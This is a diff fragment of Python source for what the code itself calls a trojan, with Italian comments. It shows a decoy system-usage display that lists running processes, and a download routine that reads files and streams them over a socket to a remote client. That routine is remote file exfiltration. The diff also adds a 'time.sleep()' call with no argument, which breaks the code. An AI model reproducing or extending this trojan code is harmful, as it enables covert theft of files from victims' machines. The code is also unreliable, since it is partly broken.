@@ -44,7 +44,7 @@ def trojanBehaviour():
             # facciamo un display a video dell'utilizzo
             print("              ------------------------------------------------------------- ")
             print(Fore.RESET + "             |"+Fore.GREEN + " CPU USAGE"+Fore.RESET+" |"+Fore.GREEN + " RAM USAGE"+Fore.RESET+" |"+Fore.GREEN + " DISK USAGE"+Fore.RESET+" |"+Fore.GREEN + " MEMORY USAGE"+Fore.RESET+" |"+Fore.GREEN + " BATTERY"+Fore.RESET+" |")
-            print(Fore.RESET + "             | {:02}%       | {:02}%       | {:02}%        | {:02}%        | {:02}%     |".format(int(cpu),
+            print(Fore.RESET + "             | {:02}%       | {:02}%       | {:02}%        | {:02}%          | {:02}%     |".format(int(cpu),
                                                                                                               int(ram),
                                                                                                               int(disk),
                                                                                                               int(mem),
@@ -55,20 +55,21 @@ def trojanBehaviour():
                 process = subprocess.Popen('tasklist /fi "MEMUSAGE gt 100000"', stdout=subprocess.PIPE,
                                            stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                                            shell=True)
+                timer = Timer(3, process.terminate)
+                try:
+                    timer.start()
+                    stdout, stderr = process.communicate()
+                    output = stdout or stderr
+                finally:
+                    timer.cancel()
+
+                final_output = output.replace(b"\r\n", b"\n").decode(encoding="windows-1252").encode()
+                time.sleep(1.5)
+                print(final_output.decode('utf-8'))
+
             else:
                 pass
 
-            timer = Timer(3, process.terminate)
-            try:
-                timer.start()
-                stdout, stderr = process.communicate()
-                output = stdout or stderr
-            finally:
-                timer.cancel()
-
-            final_output = output.replace(b"\r\n", b"\n").decode(encoding="windows-1252").encode()
-            time.sleep(1.5)
-            print(final_output.decode('utf-8'))
 
             time.sleep(7)
             clearScreen()
@@ -77,6 +78,7 @@ def trojanBehaviour():
             print("              --------------------------------------------------------- ")
             print("             | CPU USAGE | RAM USAGE | DISK USAGE | RUNNING PROCESSES |")
             print("              --------------------------------------------------------- ")
+            time.sleep()
 
 
 # OK creazione file con tutti i tipi di tipologia
@@ -284,8 +286,8 @@ def download(comando, client):
                             line = f.read(1024)
                             client.send(line)
 
-                        time.sleep(2)
                         f.close()
+                        time.sleep(2)
                         client.send(("[END]").encode(FORMAT))
             except:
                 client.send(("[ERROR]").encode(FORMAT))
